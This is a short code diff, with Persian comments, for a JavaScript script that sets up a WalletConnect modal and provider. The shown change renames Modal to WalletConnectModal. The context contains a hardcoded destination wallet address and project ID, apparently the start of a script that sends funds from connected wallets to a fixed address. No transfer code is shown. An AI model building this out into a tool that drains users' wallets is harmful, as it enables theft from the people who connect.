@@ -1,6 +1,7 @@
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { Modal } from "@walletconnect/modal";
+import { WalletConnectModal } from "@walletconnect/modal";
 import { ethers } from "ethers";
+
 
 // آدرس مقصد را اینجا جایگزین کنید
 const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
@@ -9,7 +10,7 @@ const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
 const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";
 
 // ۱. نمونه‌سازی Modal و Provider
-const modal = new Modal({
+const modal = new WalletConnectModal({
   projectId: PROJECT_ID,
   themeVariables: {},           // اختیاری: سفارشی‌سازی رنگ‌ها
   walletConnectOptions: {       // به صورت خودکار از V2 استفاده می‌کند
